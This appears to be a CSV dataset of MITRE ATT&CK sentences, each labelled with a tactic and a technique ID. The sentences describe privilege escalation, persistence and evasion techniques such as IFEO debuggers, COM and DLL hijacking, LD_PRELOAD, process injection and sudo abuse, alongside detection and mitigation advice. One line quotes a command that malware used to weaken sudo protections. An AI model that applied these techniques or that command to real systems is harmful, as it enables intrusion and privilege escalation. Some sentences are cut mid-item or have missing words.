There are several public tools available that will detect shims that are currently available :* Shim-Process-Scanner - checks memory of every running process for any shim flags* Shim-Detector-Lite - detects installation of custom shim databases* Shim-Guard - monitors registry for any shim installations* ShimScanner - forensic tool to find active shims in memory* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot),TA0004,T1546.011
Monitor for changes to windows registry keys and/or values that may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.,TA0004,T1546.011
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers.,TA0004,T1546.012
IFEOs enable a developer to attach a debugger to an application.,TA0004,T1546.012
"When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (, C:\dbg\ntsd.exe -g  notepad.exe).",TA0004,T1546.012
IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.,TA0004,T1546.012
IFEOs are represented as Debugger values in the Registry under HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ where <executable> is the binary on which the debugger is attached.,TA0004,T1546.012
"IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits ( is prematurely terminated by itself or a second, non kernel-mode process).",TA0004,T1546.012
"Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\.",TA0004,T1546.012
"Similar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe).",TA0004,T1546.012
"After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the ""debugger"" program to be executed with SYSTEM privileges.",TA0004,T1546.012
"Similar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.",TA0004,T1546.012
Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.,TA0004,T1546.012
Malware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.,TA0004,T1546.012
SDBbot has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.,TA0004,T1546.012

"Monitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles,",TA0004,T1546.012
Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.,TA0004,T1546.013
A PowerShell profile  (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.,TA0004,T1546.013
PowerShell supports several profiles depending on the user or host program.,TA0004,T1546.013
"For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code.",TA0004,T1546.013
An administrator can also configure a profile that applies to all users and host programs on the local computer.,TA0004,T1546.013
"Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence.",TA0004,T1546.013
Every time a user opens a PowerShell session the modified script will be executed unless the -NoProfile flag is used when it is launched.,TA0004,T1546.013
"An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.",TA0004,T1546.013
Turla has used PowerShell profiles to maintain persistence on an infected machine.,TA0004,T1546.013
Enforce execution of only signed PowerShell scripts.,TA0004,T1546.013
Sign profiles to avoid them from being modified.,TA0004,T1546.013
Making PowerShell profiles immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence.,TA0004,T1546.013
Avoid PowerShell profiles if not needed.,TA0004,T1546.013
Use the -No Profile flag with when executing PowerShell scripts remotely to prevent local profiles and scripts from being executed.,TA0004,T1546.013
"Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules.",TA0004,T1546.013
Locations where profile.ps1 can be stored should be monitored for new profiles.,TA0004,T1546.013
Example profile locations include:* $PsHome\Profile.ps1* $PsHome\Microsoft.,TA0004,T1546.013
{HostProgram}_profile.ps1* $Home\My Documents\PowerShell\Profile.ps1* $Home\My Documents\PowerShell\Microsoft.,TA0004,T1546.013
{HostProgram}_profile.ps1,TA0004,T1546.013
Locations where profile.ps1 can be stored should be monitored for modifications.,TA0004,T1546.013
Example profile locations include:* $PsHome\Profile.ps1* $PsHome\Microsoft.,TA0004,T1546.013
{HostProgram}_profile.ps1* $Home\My Documents\PowerShell\Profile.ps1* $Home\My Documents\PowerShell\Microsoft.,TA0004,T1546.013
{HostProgram}_profile.ps1,TA0004,T1546.013
Monitor newly executed processes that may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.,TA0004,T1546.013
Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond).,TA0004,T1546.014
"Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action.",TA0004,T1546.014
The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.,TA0004,T1546.014
"The rule files are in the plist format and define the name, event type, and action to take.",TA0004,T1546.014
Some examples of event types include system startup and user authentication.,TA0004,T1546.014
Examples of actions are to run a system command or send an email.,TA0004,T1546.014
"The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the Launch Daemon configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.",TA0004,T1546.014
"Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.",TA0004,T1546.014
Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.,TA0004,T1546.014
Monitor executed commands and arguments that may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond).,TA0004,T1546.014

Monitor newly executed processes that may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond).,TA0004,T1546.014
Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.,TA0004,T1546.015
COM is a system within Windows to enable interaction between software components through the operating system.,TA0004,T1546.015
References to various COM objects are stored in the Registry.,TA0004,T1546.015
Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence.,TA0004,T1546.015
Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed.,TA0004,T1546.015
When that system component is executed through normal system operation the adversary's code will be executed instead.,TA0004,T1546.015
"An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",TA0004,T1546.015
Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.,TA0004,T1546.015
APT28 has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.,TA0004,T1546.015
BBSRAT has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.,TA0004,T1546.015
ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32.,TA0004,T1546.015
Ferocious can use COM hijacking to establish persistence.,TA0004,T1546.015
JHUHUGIT has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).,TA0004,T1546.015
KONNI has modified ComSysApp service to load the malicious DLL payload.,TA0004,T1546.015

WarzoneRAT  can perform COM hijacking by setting the path to itself to the HKCU\Software\Classes\Folder\shell\open\command key with a DelegateExecute parameter.,TA0004,T1546.015
Monitor executed commands and arguments that may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.,TA0004,T1546.015
"Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.",TA0004,T1546.015
Monitor newly executed processes that may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.,TA0004,T1546.015
There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: Reg) replacing known binary paths with unknown paths or otherwise malicious content.,TA0004,T1546.015
"Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\Software\Classes\CLSID\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID.",TA0004,T1546.015
Registry entries for existing COM objects may change infrequently.,TA0004,T1546.015
"When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.",TA0004,T1546.015
Adversaries may exploit software vulnerabilities in an attempt to elevate privileges.,TA0004,T1068
"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.",TA0004,T1068
"Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.",TA0004,T1068
"When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system.",TA0004,T1068
"Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system.",TA0004,T1068
This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable.,TA0004,T1068
"This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host.",TA0004,T1068
This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.,TA0004,T1068
Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode.,TA0004,T1068
This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).,TA0004,T1068
Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.,TA0004,T1068

There are many ways an adversary can hijack DLL loads.,TA0004,T1574.001
"Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program.",TA0004,T1574.001
"Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL.",TA0004,T1574.001
Often this location is the current working directory of the program.,TA0004,T1574.001
Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.,TA0004,T1574.001
"Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.",TA0004,T1574.001
"If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level.",TA0004,T1574.001
"In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.",TA0004,T1574.001

"Monitor newly constructed processes for unusual activity (, a process that does not use the network begins to do so) as well as the introduction of new files/programs.",TA0004,T1574.002
Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime.,TA0004,T1574.004
The dynamic loader will try to find the dylibs based on the sequential order of the search paths.,TA0004,T1574.004
"Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.",TA0004,T1574.004
"Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present.",TA0004,T1574.004

Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking,TA0004,T1574.004
Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer.,TA0004,T1574.005
These processes may automatically execute specific binaries as part of their functionality or to perform other actions.,TA0004,T1574.005
"If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process.",TA0004,T1574.005
"If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.",TA0004,T1574.005
"Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers.",TA0004,T1574.005
"During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads.",TA0004,T1574.005
"When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process.",TA0004,T1574.005
This behavior is related to and may take advantage of DLL Search Order Hijacking.,TA0004,T1574.005
Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.,TA0004,T1574.005
Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code.,TA0004,T1574.005
This behavior is related to Bypass User Account Control.,TA0004,T1574.005
Several examples of this weakness in existing common installers have been reported to software vendors.,TA0004,T1574.005

Monitor for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.,TA0004,T1574.005
Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries.,TA0004,T1574.006
"During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS.",TA0004,T1574.006
"Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.",TA0004,T1574.006
"These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.",TA0004,T1574.006
"On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",TA0004,T1574.006
This method may also evade detection from security products since the execution is masked under a legitimate process.,TA0004,T1574.006
"Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function.",TA0004,T1574.006
Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s os.environ.,TA0004,T1574.006
"On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.",TA0004,T1574.006
LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file.,TA0004,T1574.006
Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen() and mmap() respectively.,TA0004,T1574.006
"On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level.",TA0004,T1574.006

The PATH environment variable contains a list of directories.,TA0004,T1574.007
Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given.,TA0004,T1574.007
"If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (, C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.",TA0004,T1574.007
"For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",TA0004,T1574.007

Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR.,TA0004,T1574.012
The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR).,TA0004,T1574.012
"These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.",TA0004,T1574.012
"The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence.",TA0004,T1574.012
"System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL.",TA0004,T1574.012
A process scope COR_PROFILER can also be created in-memory without modifying the Registry.,TA0004,T1574.012
"Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.",TA0004,T1574.012
Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked.,TA0004,T1574.012
"The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.",TA0004,T1574.012

Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads.,TA0004,T1574.013
The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.,TA0004,T1574.013
An adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload.,TA0004,T1574.013
Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.,TA0004,T1574.013
A pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function).,TA0004,T1574.013
"Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (, fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()).",TA0004,T1574.013
The PEB is then updated with the new address of the table.,TA0004,T1574.013
"Once the tampered function is invoked, the malicious payload will be triggered.",TA0004,T1574.013
The tampered function is typically invoked using a Windows message.,TA0004,T1574.013
"After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload.",TA0004,T1574.013
Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.,TA0004,T1574.013

Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.,TA0004,T1055.003
"Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL.",TA0004,T1055.003

Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem.,TA0004,T1055.009
This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR).,TA0004,T1055.009

Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class.,TA0004,T1055.011
This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.,TA0004,T1055.011

"Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.",TA0004,T1055.011
Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges.,TA0004,T1055.011
Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.,TA0004,T1055.011

Process hollowing is a method of executing arbitrary code in the address space of a separate live process.,TA0004,T1055.012
"Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code.",TA0004,T1055.012
"A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread.",TA0004,T1055.012

Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.,TA0004,T1055.013
Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.,TA0004,T1055.013
"To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time.",TA0004,T1055.013
"Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.",TA0004,T1055.013

"Similar to Process Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection.",TA0004,T1055.013
"Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.",TA0004,T1055.013
Process Doppelgänging is implemented in 4 steps :,TA0004,T1055.013

Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges.,TA0004,T1055.014
Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.,TA0004,T1055.014
VDSO hijacking involves redirecting calls to dynamically linked shared libraries.,TA0004,T1055.014
Memory protections may prevent writing executable code to a process via Ptrace System Calls.,TA0004,T1055.014
"However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object.",TA0004,T1055.014
This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).,TA0004,T1055.014

"Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window (via Windows API calls such as FindWindow and/or EnumWindows) or other Process Injection methods.",TA0004,T1055.015
"Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function.",TA0004,T1055.015
"For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory.",TA0004,T1055.015
"Finally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.",TA0004,T1055.015

Consider updating Windows to the latest version and patch level to utilize the latest protective measures against UAC bypass.,TA0005,T1548.002
"Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking.",TA0005,T1548.002
Monitor executed commands and arguments that may bypass UAC mechanisms to elevate process privileges on system.,TA0005,T1548.002

Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges.,TA0005,T1548.003
Adversaries may do this to execute commands as other users or spawn processes with higher privileges.,TA0005,T1548.003
"Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system.",TA0005,T1548.003
"The sudo command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.""",TA0005,T1548.003
"Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password.",TA0005,T1548.003
This is because sudo has the ability to cache credentials for a period of time.,TA0005,T1548.003
Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout.,TA0005,T1548.003
"Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation.",TA0005,T1548.003
"This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).",TA0005,T1548.003
"The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals.",TA0005,T1548.003
This also describes which commands users can run as other users or groups.,TA0005,T1548.003
"This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password.",TA0005,T1548.003
"However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL.",TA0005,T1548.003
Elevated privileges are required to edit this file though.,TA0005,T1548.003
Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password.,TA0005,T1548.003
"For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range.",TA0005,T1548.003
"If it does, then malware can execute sudo commands without needing to supply the user's password.",TA0005,T1548.003
"Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.",TA0005,T1548.003
"In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \'Defaults !tty_tickets\' >> /etc/sudoers.",TA0005,T1548.003
"In order for this change to be reflected, the malware also issued killall Terminal.",TA0005,T1548.003
"As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",TA0005,T1548.003
Cobalt Strike can use sudo to run a command.,TA0005,T1548.003

Proton modifies the tty_tickets line in the sudoers file.,TA0005,T1548.003
Ensuring that the tty_tickets setting is enabled will prevent this leakage across tty sessions.,TA0005,T1548.003
"By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file.",TA0005,T1548.003
Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed.,TA0005,T1548.003
The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege.,TA0005,T1548.003

"Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may perform sudo caching and/or use the suoders file to elevate privileges.",TA0005,T1548.003
Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.,TA0005,T1548.004
"The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.",TA0005,T1548.004
This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.,TA0005,T1548.004
"Although this API is deprecated, it still fully functions in the latest releases of macOS.",TA0005,T1548.004
"When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made.",TA0005,T1548.004
The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.,TA0005,T1548.004
Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.,TA0005,T1548.004
This technique may be combined with Masquerading to trick the user into granting escalated privileges to malicious code.,TA0005,T1548.004
This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.,TA0005,T1548.004
OSX/Shlayer can escalate privileges to root by asking the user for credentials.,TA0005,T1548.004
System settings can prevent applications from running that haven't been downloaded through the Apple Store which may help mitigate some of these issues.,TA0005,T1548.004
Not allowing unsigned applications from being run may also mitigate some risk.,TA0005,T1548.004
Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.,TA0005,T1548.004
Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed.,TA0005,T1548.004
MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called.,TA0005,T1548.004
Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls.,TA0005,T1134
Windows uses access tokens to determine the ownership of a running process.,TA0005,T1134
A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process.,TA0005,T1134
"When this occurs, the process also takes on the security context associated with the new token.",TA0005,T1134
An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.,TA0005,T1134
These token can then be applied to an existing process ( Token Impersonation/Theft) or used to spawn a new process ( Create Process with Token).,TA0005,T1134
An adversary must already be in a privileged user context ( administrator) to steal a token.,TA0005,T1134
"However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level.",TA0005,T1134
An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.,TA0005,T1134
"Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.",TA0005,T1134
"There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",TA0005,T1134

"Consider applying SID Filtering to interforest trusts, such as forest trusts and external trusts, to exclude SID-History from requests to access domain resources.",TA0005,T1134.005
SID Filtering ensures that any authentication requests over a trust only contain SIDs of security principals from the trusted domain (i.e preventing the trusted domain from claiming a user has membership in groups outside of the domain).,TA0005,T1134.005
"SID Filtering of forest trusts is enabled by default, but may have been disabled in some cases to allow a child domain to transitively access forest trusts.",TA0005,T1134.005
SID Filtering of external trusts is automatically enabled on all created external trusts using Server 2003 or later domain controllers.,TA0005,T1134.005

Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads.,TA0005,T1197
"Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM).",TA0005,T1197
"BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications.",TA0005,T1197
"File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.",TA0005,T1197
The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.,TA0005,T1197

Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry.,TA0005,T1612
"A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.",TA0005,T1612
"An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.",TA0005,T1612
"If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image.",TA0005,T1612

Adversaries may employ various means to detect and avoid debuggers.,TA0005,T1622
Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.,TA0005,T1622
Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment.,TA0005,T1622
"Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant.",TA0005,T1622
They may also search for debugger artifacts before dropping secondary or additional payloads.,TA0005,T1622
"Specific checks will vary based on the target and/or adversary, but may involve Native API function calls such as IsDebuggerPresent() and  NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB).",TA0005,T1622
"Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would ""swallow"" or handle the potential error).",TA0005,T1622
Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors.,TA0005,T1622
Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as OutputDebugStringW().,TA0005,T1622

Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required.,TA0005,T1622
"Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.",TA0005,T1622
Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment.,TA0005,T1622
"Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.",TA0005,T1622
Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis.,TA0005,T1140
